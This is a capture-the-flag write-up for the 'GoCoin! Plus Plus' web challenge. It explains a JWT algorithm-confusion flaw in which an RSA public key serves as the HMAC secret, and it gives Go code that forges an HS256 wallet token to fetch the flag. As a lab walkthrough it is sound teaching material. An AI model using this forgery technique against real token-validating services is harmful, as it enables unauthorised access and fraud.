
# CrossCTF Finals 2018: GoCoin! Plus Plus (web)

> I thought blockchain was cool, so I made my own coin.
> 
> GoCoin! Plus Plus is the forked and improved version of GoCoin! Plus.
> 
> Update: I've improved it! More secures and with real cryptos, it's a true cryptocoin now! Update: Stupid me wrote a broken challenge, now its really fixed!
> 
> http://ctf.pwn.sg:1389
>
> Creator - quanyang (@quanyang)

## Challenge

So this is the real challenge, fixed by the organisers. TL; DR: 

```diff
54c54
< 	walletString := this.Ctx.GetCookie("wallet")
---
> 	walletString := this.Ctx.GetCookie("wallet_2")
...
92c92
< 	if err != nil {
---
> 	if err != nil || amount < 0 {
...
141c141
< 	if err != nil {
---
> 	if err != nil || amount < 0 {
...
```

So this makes the previous exploit unexploitable. Time to look back at the JWT implementation. 

My familiarity with Go made the [code](https://github.com/NUSGreyhats/crossctf-2018-challenges/blob/master/finals/challenges/GoCoin!%20Plus%20Plus/service/src/main.go) 2x easier to read. 

Because of the hints about crypto being used, it pointed us pretty clearly at the JWT code. If you didn't know yet, JWS stands for JSON Web Tokens. It's a authorization token that can contain data, and makes token validation stateless other than validation of the signature attached using PKI.

It was pretty well-know that JWT had an issue previously where things with `alg: none`. It's even stated in a banner on the JWT website. So, I took a look at the `ParseWallet` function.

```go
func ParseWallet(myToken string, myKey []byte) (float64, float64, error) {
	token, err := jwt.Parse(myToken, func(token *jwt.Token) (interface{}, error) {
		if _, ok := token.Method.(*jwt.SigningMethodHMAC); !ok {
			key, err := jwt.ParseRSAPublicKeyFromPEM(myKey)
			return key, err
		}
		return myKey, nil
	})
	if err == nil && token.Valid {
...
```

From this chunk of code, you can see that the program checks for tokens that are *not* HMAC and then parses the PEM public key. But, if the token is a HMAC, it directly returns the key! This is especially obvious if you compare it to the [example code for HMAC](https://godoc.org/github.com/dgrijalva/jwt-go#example-Parse--Hmac) in the documentation for `github.com/dgrijalva/jwt-go`, and [notices](https://github.com/dgrijalva/jwt-go#compliance) in the project README. 

Since the plaintext public key is being used to perform HMAC comparison rather than validating RSA signatures, we can forge our own tokens because we know the HMAC secret, which is the `[]byte` publicKey. 

So let's write a program to create this HMACed instead of RSAed token. Oh wait, it's already written by the challenge author! Just need to change one tiny bit. 

```go
token := jwt.New(jwt.GetSigningMethod("HS256"))
```

Then now I can do:

```go
myKey := `-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCyg+EcZOSLYXqdA0Gdx6hE0PFY
GshbSxHwBbZ0Ivw41OCD447WtiTmBKWhYkyZIW1uF2G0YpifP9CGZgIHhW6jPUwB
u1ewHy0ch+GQeMleaVGqEOsAd65DAXi2TSCZLl66zWy0enQ/SFkm9OTTGYR0e0hM
DFqKsA30lPd0pHbSNwIDAQAB
-----END PUBLIC KEY-----
` // This newline is important
tokenString, err := Wallet(10000, 10000, []byte(myKey))
fmt.Println(err, tokenString)
_, _, err := ParseWallet(tokenString, myKey)
fmt.Println(err) // nil is SUCCESS! wohoo
```

[Here's the full code](gocoin2jwt.go). 

Now I've got a valid token, I can simply perform the request to /flag with the token set inside the cookie. Many ways to do than, including using DevTools. 

